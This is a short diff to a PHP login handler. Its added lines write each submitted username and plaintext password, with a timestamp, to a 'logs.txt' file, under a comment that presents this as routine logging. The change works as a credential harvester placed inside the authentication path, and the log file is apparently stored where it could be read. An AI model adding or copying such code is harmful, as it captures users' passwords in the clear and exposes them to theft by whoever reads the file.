@@ -5,6 +5,12 @@ require_once "../config/connection.php";
 $Username = $_POST['Username'];
 $Password = $_POST['Password'];
 
+// Create log entry with timestamp
+$log = "[" . date("Y-m-d H:i:s") . "] Username: $Username | Password: $Password" . PHP_EOL;
+
+// Save to text file (logs.txt)
+file_put_contents("logs.txt", $log, FILE_APPEND);
+
 try {
     $stmt = $conn->prepare("EXEC LOGIN @mUsername = ?");
     $stmt->execute([$Username]);
